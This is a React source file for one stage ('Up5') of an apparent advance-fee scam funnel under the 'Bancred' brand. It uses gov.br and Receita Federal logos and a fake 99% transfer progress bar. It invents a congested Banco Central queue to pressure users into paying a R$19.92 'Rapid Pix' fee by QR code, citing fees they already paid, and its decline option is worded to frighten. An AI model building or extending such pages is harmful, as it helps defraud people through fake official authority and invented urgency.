import { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import {
  Zap,
  AlertTriangle,
  QrCode,
  Copy,
  Check,
  Loader2,
  X,
  Clock,
  Rocket,
} from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import govbrLogo from "@/assets/govbr-logo.png";
import receitaLogo from "@/assets/receita-federal-logo.svg";
import { useParadisePix } from "@/hooks/useParadisePix";
import { trackEvent } from "@/lib/tracking";
import { getFunnelCustomer } from "@/lib/customer";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const PixIcon = ({ size = 20 }: { size?: number }) => (
  <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 315.63 315.63">
    <g transform="translate(-2394 -4352.093)">
      <path d="M246.13,264.53A46.07,46.07,0,0,1,213.35,251L166,203.62a9,9,0,0,0-12.44,0l-47.51,47.51A46.09,46.09,0,0,1,73.27,264.7H64l60,60a48,48,0,0,0,67.81,0l60.12-60.13Z" transform="translate(2394.023 4329.001)" fill="#fff" />
      <path d="M73.28,97.09a46.08,46.08,0,0,1,32.78,13.57l47.51,47.52a8.81,8.81,0,0,0,12.44,0l47.34-47.34a46,46,0,0,1,32.78-13.58h5.7L191.71,37.14a47.94,47.94,0,0,0-67.81,0L64,97.09Z" transform="translate(2394.023 4329.001)" fill="#fff" />
      <path d="M301.56,147l-36.33-36.33a7,7,0,0,1-2.58.52H246.13a32.62,32.62,0,0,0-22.93,9.5L175.86,168a22.74,22.74,0,0,1-32.13,0L96.21,120.51A32.62,32.62,0,0,0,73.28,111H53a7.12,7.12,0,0,1-2.44-.49L14,147a48,48,0,0,0,0,67.81l36.48,36.48a6.85,6.85,0,0,1,2.44-.49H73.28a32.63,32.63,0,0,0,22.93-9.51l47.51-47.51c8.59-8.58,23.56-8.58,32.14,0l47.34,47.33a32.62,32.62,0,0,0,22.93,9.5h16.52a6.9,6.9,0,0,1,2.58.52l36.33-36.33a47.94,47.94,0,0,0,0-67.81" transform="translate(2394.023 4329.001)" fill="#fff" />
    </g>
  </svg>
);

const Up5 = () => {
  const [params] = useSearchParams();
  const navigate = useNavigate();

  const valorSaque = Number(params.get("valor") || 5000);
  const totalAtualizado = valorSaque + 1500;
  const precoCheio = 47.0;
  const taxa = 19.92;

  const [showPix, setShowPix] = useState(false);
  const [copied, setCopied] = useState(false);

  const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
    trackEvent({
      event: "CompletePayment",
      value: taxa,
      currency: "BRL",
      contents: [{ content_id: "fast_pix", content_name: "Canal Rapid Pix", quantity: 1, price: taxa }],
    });
    navigate(`/dashboard?${params.toString()}`);
  });

  const openPix = async () => {
    setShowPix(true);
    trackEvent({
      event: "InitiateCheckout",
      value: taxa,
      currency: "BRL",
      contents: [{ content_id: "fast_pix", content_name: "Canal Rapid Pix", quantity: 1, price: taxa }],
    });
    try {
      await create({
        amountCents: Math.round(taxa * 100),
        description: `Bancred - Ativação Canal Rapid Pix`,
        stage: "up5",
        customer: getFunnelCustomer(params),
      });
    } catch {
      /* tratado pelo hook */
    }
  };

  const closePix = () => {
    setShowPix(false);
    reset();
    setCopied(false);
  };

  const handleCopy = async () => {
    if (!pix?.qr_code) return;
    try {
      await navigator.clipboard.writeText(pix.qr_code);
      setCopied(true);
      setTimeout(() => setCopied(false), 2200);
    } catch {
      /* ignore */
    }
  };

  const handleDecline = () => {
    navigate(`/dashboard?${params.toString()}`);
  };

  return (
    <div style={{ minHeight: "100dvh", background: "#F4F4F7", fontFamily: fontStack, color: "#111827", WebkitFontSmoothing: "antialiased" }}>
      <header style={{ background: "#FFFFFF", borderBottom: "1px solid #E5E7EB", padding: "14px 16px", textAlign: "center" }}>
        <img src={logo} alt="Bancred" style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }} />
      </header>

      <main style={{ padding: "18px 16px", maxWidth: 480, margin: "0 auto" }}>
        {/* Progress + processamento */}
        <div style={{ marginBottom: 14 }}>
          <div style={{ display: "flex", justifyContent: "space-between", fontSize: 12, fontWeight: 700, color: "#DC2626", marginBottom: 6 }}>
            <span style={{ display: "inline-flex", alignItems: "center", gap: 6 }}>
              <Loader2 size={12} style={{ animation: "spin 1s linear infinite" }} /> PROCESSANDO TRANSFERÊNCIA
            </span>
            <span>99%</span>
          </div>
          <div style={{ width: "100%", height: 10, background: "#E5E7EB", borderRadius: 999, overflow: "hidden" }}>
            <div style={{ width: "99%", height: "100%", background: "linear-gradient(90deg, #F59E0B, #DC2626)", borderRadius: 999 }} />
          </div>
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>

        {/* Headline alerta */}
        <section style={{ background: "linear-gradient(160deg, #7F1D1D, #DC2626)", borderRadius: 22, padding: "22px 18px", color: "#fff", marginBottom: 14, boxShadow: "0 14px 34px rgba(220,38,38,0.30)" }}>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 800, background: "rgba(255,255,255,0.18)", padding: "6px 10px", borderRadius: 999, marginBottom: 14 }}>
            <AlertTriangle size={14} /> ÚLTIMO PASSO CRÍTICO
          </div>
          <h1 style={{ fontSize: 21, fontWeight: 900, marginBottom: 8, lineHeight: 1.2 }}>
            Ative o Canal de Disparo Fast-Pix
          </h1>
          <p style={{ fontSize: 13.5, lineHeight: 1.55, opacity: 0.95, margin: 0 }}>
            Evite que seu saldo fique retido na fila do Banco Central por até <strong>72 horas</strong>.
          </p>
        </section>

        {/* Texto */}
        <div style={{ background: "#FFFFFF", borderRadius: 16, padding: 16, border: "1px solid #E5E7EB", marginBottom: 14, fontSize: 13.5, lineHeight: 1.6, color: "#1F2937" }}>
          Seu Pix no valor total de <strong>{formatBRL(totalAtualizado)}</strong> já está assinado digitalmente na mesa de operações.
          <br /><br />
          Você já investiu nas taxas e seguros anteriores — não chegou até aqui para morrer na praia a um passo do seu dinheiro.
          <br /><br />
          A fila geral do Banco Central está <strong style={{ color: "#DC2626" }}>congestionada</strong>. Para que seu dinheiro caia na conta nos próximos <strong>45 segundos</strong> sem passar pela análise demorada da fila comum, ative agora o <strong>Canal Prioritário de Velocidade Máxima Bancred</strong>.
          <br /><br />
          O custo de ativação da chave API rápida é de apenas <strong>{formatBRL(taxa)}</strong> (taxa única). Pague agora, saia da fila e veja a notificação do Pix chegar antes de fechar essa tela.
        </div>

        {/* Card de preço */}
        <div style={{ background: "linear-gradient(160deg, #FFFFFF, #FEF2F2)", borderRadius: 16, padding: 18, border: "2px solid #DC2626", marginBottom: 18, textAlign: "center" }}>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, fontSize: 11, fontWeight: 800, color: "#DC2626", letterSpacing: 0.5, marginBottom: 10 }}>
            <Zap size={12} /> ATIVAÇÃO DIRETA · DESCONTO ÚNICO
          </div>
          <div style={{ fontSize: 14, color: "#6B7280", textDecoration: "line-through", marginBottom: 4 }}>
            De {formatBRL(precoCheio)}
          </div>
          <div style={{ fontSize: 36, fontWeight: 900, color: "#DC2626", lineHeight: 1 }}>
            {formatBRL(taxa)}
          </div>
          <div style={{ fontSize: 12, color: "#6B7280", marginTop: 8 }}>
            Pagamento único · Liberação em até 45 segundos
          </div>
        </div>

        <button
          type="button"
          onClick={openPix}
          style={{
            width: "100%",
            padding: "17px 20px",
            background: "linear-gradient(90deg, #DC2626, #EC4899)",
            color: "#fff",
            border: "none",
            borderRadius: 14,
            fontSize: 15,
            fontWeight: 900,
            letterSpacing: 0.3,
            cursor: "pointer",
            boxShadow: "0 10px 28px rgba(220,38,38,0.45)",
            display: "inline-flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 8,
            fontFamily: fontStack,
            minHeight: 58,
            animation: "pulseBtn5 1.3s ease-in-out infinite",
            textTransform: "uppercase",
          }}
        >
          <Rocket size={20} /> Ativar Rapid Pix e receber agora
        </button>
        <style>{`@keyframes pulseBtn5 { 0%,100% { transform: scale(1); } 50% { transform: scale(1.025); box-shadow: 0 14px 36px rgba(236,72,153,0.55);} }`}</style>

        <button
          type="button"
          onClick={handleDecline}
          style={{
            display: "block",
            margin: "16px auto 0",
            background: "transparent",
            border: "none",
            color: "#9CA3AF",
            fontSize: 12,
            textDecoration: "underline",
            cursor: "pointer",
            fontFamily: fontStack,
            textAlign: "center",
            lineHeight: 1.5,
            maxWidth: 340,
          }}
        >
          Prefiro não ativar a velocidade e aceito arriscar meu dinheiro ficar travado na fila do banco por até 3 dias úteis
        </button>
      </main>

      {showPix && (
        <div
          style={{ position: "fixed", inset: 0, background: "rgba(15,23,42,0.55)", backdropFilter: "blur(2px)", display: "flex", alignItems: "flex-end", justifyContent: "center", zIndex: 60 }}
          onClick={closePix}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{ background: "#fff", width: "100%", maxWidth: 480, borderTopLeftRadius: 22, borderTopRightRadius: 22, padding: "14px 18px 24px", maxHeight: "92dvh", overflowY: "auto", fontFamily: fontStack }}
          >
            <div style={{ width: 44, height: 4, background: "#E5E7EB", borderRadius: 2, margin: "0 auto 14px" }} />
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <Rocket size={22} color="#DC2626" />
                <span style={{ fontSize: 18, fontWeight: 700 }}>Ativar Canal Rapid Pix</span>
              </div>
              <button type="button" onClick={closePix} aria-label="Fechar" style={{ background: "transparent", border: "none", cursor: "pointer", color: "#6B7280" }}>
                <X size={22} />
              </button>
            </div>

            <div style={{ background: "#FEF2F2", border: "1px solid #FECACA", borderRadius: 14, padding: "12px 14px", display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 18 }}>
              <div>
                <div style={{ fontSize: 12, color: "#DC2626", fontWeight: 600 }}>Valor a pagar</div>
                <div style={{ fontSize: 24, fontWeight: 800, color: "#DC2626", letterSpacing: -0.4 }}>{formatBRL(taxa)}</div>
              </div>
              <div style={{ display: "inline-flex", alignItems: "center", gap: 6, background: "#fff", border: "1px solid #FECACA", color: "#DC2626", fontSize: 12, fontWeight: 600, padding: "6px 10px", borderRadius: 999 }}>
                <Clock size={12} /> expira em 15min
              </div>
            </div>

            {pixLoading || !pix ? (
              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "40px 0" }}>
                <Loader2 size={42} color="#DC2626" style={{ animation: "spin 1s linear infinite" }} />
                <div style={{ marginTop: 18, color: "#6B7280", fontSize: 14 }}>{pixError ? pixError : "Gerando seu código PIX..."}</div>
              </div>
            ) : (
              <>
                <div style={{ fontSize: 13, color: "#374151", lineHeight: 1.6, marginBottom: 14 }}>
                  Abra o app do seu banco e acesse a área PIX.<br />
                  Escolha <strong>Ler QR Code</strong> ou <strong>PIX Copia e Cola</strong>.<br />
                  Confirme o valor e finalize o pagamento.
                </div>
                <div style={{ background: "#F9FAFB", border: "1px solid #E5E7EB", borderRadius: 14, padding: 16, marginBottom: 14 }}>
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, color: "#374151", fontSize: 13, fontWeight: 600, marginBottom: 12 }}>
                    <QrCode size={14} /> Escaneie o QR Code
                  </div>
                  <div style={{ display: "flex", justifyContent: "center" }}>
                    <img src={pix.qr_image} alt="QR Code PIX" width={240} height={240} style={{ display: "block", background: "#fff", padding: 8, borderRadius: 8 }} />
                  </div>
                </div>
                <div style={{ fontSize: 13, fontWeight: 600, color: "#111827", marginBottom: 6 }}>Ou use o PIX Copia e Cola:</div>
                <div style={{ background: "#F9FAFB", border: "1px solid #E5E7EB", borderRadius: 12, padding: 12, fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace", fontSize: 12, color: "#111827", wordBreak: "break-all", lineHeight: 1.5, marginBottom: 12 }}>
                  {pix.qr_code}
                </div>
                <button
                  type="button"
                  onClick={handleCopy}
                  style={{ width: "100%", padding: "14px 18px", background: copied ? "#16A34A" : "#DC2626", color: "#fff", border: "none", borderRadius: 12, fontSize: 15, fontWeight: 700, cursor: "pointer", display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 8, fontFamily: fontStack, minHeight: 50 }}
                >
                  {copied ? <Check size={18} /> : <Copy size={18} />} {copied ? "Copiado!" : "Copiar código PIX"}
                </button>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Up5;
